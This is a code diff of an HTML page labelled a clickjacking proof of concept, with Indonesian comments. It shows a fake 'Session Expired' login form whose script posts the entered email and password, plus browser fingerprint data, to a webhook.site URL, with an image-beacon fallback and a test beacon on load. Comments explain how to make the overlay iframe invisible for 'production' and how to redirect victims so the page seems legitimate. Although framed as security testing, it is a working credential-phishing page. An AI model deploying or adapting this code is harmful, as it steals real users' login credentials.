@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Required</title>
+    <title>Login Required - Clickjacking PoC</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -12,35 +12,42 @@
         }
         .container {
             max-width: 400px;
-            margin: 0 auto;
+            margin: 50px auto;
             background: white;
             padding: 20px;
-            border: 1px solid #ccc;
+            border: 2px solid #333;
         }
         h2 {
             margin-top: 0;
-            color: #333;
+            color: #c00;
         }
         input {
             width: 100%;
-            padding: 8px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #999;
             box-sizing: border-box;
+            font-size: 16px;
         }
         button {
             width: 100%;
-            padding: 10px;
-            background: #4CAF50;
+            padding: 12px;
+            background: #c00;
             color: white;
             border: none;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            margin: 10px 0;
         }
-        .note {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
+        .debug {
+            margin-top: 30px;
+            padding: 15px;
+            background: #ffd;
+            border: 1px dashed #c00;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
         }
         iframe {
             position: fixed;
@@ -48,103 +55,135 @@
             left: 0;
             width: 100%;
             height: 100%;
-            border: none;
-            opacity: 0.01;
+            border: 2px solid red; /* Ubah ke opacity:0 untuk production */
+            opacity: 0.3; /* 0.3 untuk testing biar keliatan, 0 untuk live */
             z-index: 9999;
             pointer-events: auto;
+            background: transparent;
         }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            background: #e8f5e9;
-            display: none;
-            word-break: break-all;
-            font-size: 12px;
+        .warning {
+            color: #c00;
+            font-weight: bold;
+            margin: 10px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Session Expired</h2>
-        <p>Please login again to continue</p>
+        <h2>⚠️ SESSION EXPIRED</h2>
+        <p>Your session has expired. Please login again to continue.</p>
+        <div class="warning">* Login credentials will be sent to webhook.site</div>
         
-        <form id="loginForm" action="https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c" method="POST">
-            <input type="email" name="email" placeholder="Email" value="test@example.com">
-            <input type="password" name="password" placeholder="Password" value="password123">
-            <button type="submit" id="submitBtn">Login</button>
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Email address" value="test@example.com" required>
+            <input type="password" id="password" name="password" placeholder="Password" value="password123" required>
+            <button type="button" id="submitBtn">LOGIN NOW</button>
         </form>
         
-        <div class="note">
-            ⚠️ This is a demo - credentials will be sent to webhook
-        </div>
-        
-        <div class="status" id="status">
-            ✓ Data sent to webhook: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c
+        <div class="debug" id="debug">
+            Status: Waiting for click...
         </div>
     </div>
 
-    <!-- Clickjacking iframe target - using a dummy page since we can't load chrome://settings directly -->
+    <!-- Clickjacking iframe - transparan -->
     <iframe src="about:blank" id="clickjackFrame"></iframe>
 
     <script>
-        // Function to capture form data and send to webhook
-        function captureAndSend() {
-            const email = document.querySelector('input[name="email"]').value;
-            const password = document.querySelector('input[name="password"]').value;
+        // Fungsi untuk mengirim data ke webhook
+        function sendToWebhook(email, password) {
+            const debug = document.getElementById('debug');
             
-            // Send to webhook
+            // Data yang akan dikirim
+            const data = {
+                timestamp: new Date().toISOString(),
+                type: 'autofill_clickjacking_poc',
+                email: email,
+                password: password,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: screen.width + 'x' + screen.height,
+                url: window.location.href,
+                referrer: document.referrer || 'direct'
+            };
+            
+            // Update debug
+            debug.innerHTML = '📤 Sending data to webhook...<br>' + 
+                             'Email: ' + email + '<br>' +
+                             'Password: ' + password + '<br>' +
+                             'URL: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c';
+            
+            // Kirim ke webhook
             fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
                 method: 'POST',
+                mode: 'no-cors', // Pakai no-cors biar gak kena CORS error
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    type: 'autofill_capture',
-                    email: email,
-                    password: password,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    url: window.location.href
-                })
+                body: JSON.stringify(data)
             })
-            .then(response => {
-                document.getElementById('status').style.display = 'block';
-                console.log('Data sent to webhook');
+            .then(() => {
+                debug.innerHTML += '<br><br>✅ Data sent successfully!<br>';
+                debug.innerHTML += 'Check: <b>https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c</b>';
             })
             .catch(error => {
-                console.error('Error:', error);
-                alert('Data captured but failed to send to webhook');
+                debug.innerHTML += '<br><br>❌ Error sending: ' + error;
+                // Fallback - coba kirim pake cara lain
+                fallbackSend(data);
             });
+            
+            // Simpan ke localStorage untuk bukti
+            localStorage.setItem('captured_' + Date.now(), JSON.stringify(data));
         }
-
-        // Simulate clickjacking by intercepting the button click
-        document.getElementById('submitBtn').addEventListener('click', function(e) {
-            e.preventDefault(); // Prevent actual form submission
-            captureAndSend();
+        
+        // Fallback method pake image beacon
+        function fallbackSend(data) {
+            const img = new Image();
+            img.src = 'https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c?data=' + 
+                      encodeURIComponent(JSON.stringify(data));
+            document.getElementById('debug').innerHTML += '<br>📡 Fallback method used';
+        }
+        
+        // Event listener untuk tombol
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            // In a real clickjacking scenario, this would be triggered by the user clicking through a transparent iframe
-            console.log('Clickjacking simulation: User clicked through transparent iframe');
+            if (!email || !password) {
+                alert('Email and password required');
+                return;
+            }
             
-            // Optional: Redirect to legitimate site after capture
-            // window.location.href = 'https://google.com';
+            sendToWebhook(email, password);
+            
+            // Opsional: redirect ke Google biar keliatan legitimate
+            // setTimeout(() => {
+            //     window.location.href = 'https://google.com';
+            // }, 2000);
         });
-
-        // Also capture when form is submitted via Enter key
+        
+        // Event listener untuk form submit (Enter key)
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            captureAndSend();
+            document.getElementById('submitBtn').click();
         });
-
-        // Auto-submit after 3 seconds to simulate autofill (for testing)
+        
+        // Log di console
+        console.log('=== CLICKJACKING PoC READY ===');
+        console.log('Webhook: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c');
+        console.log('Iframe opacity: 0.3 (visible for testing)');
+        console.log('===============================');
+        
+        // Test webhook di background
         setTimeout(() => {
-            console.log('Auto-trigger for testing - remove in production');
-            // Uncomment for testing:
-            // captureAndSend();
-        }, 3000);
-
-        // Log for debugging
-        console.log('PoC ready - Webhook target: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c');
+            console.log('Testing webhook connection...');
+            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({test: true, message: 'PoC loaded'})
+            });
+        }, 1000);
     </script>
 </body>
 </html>
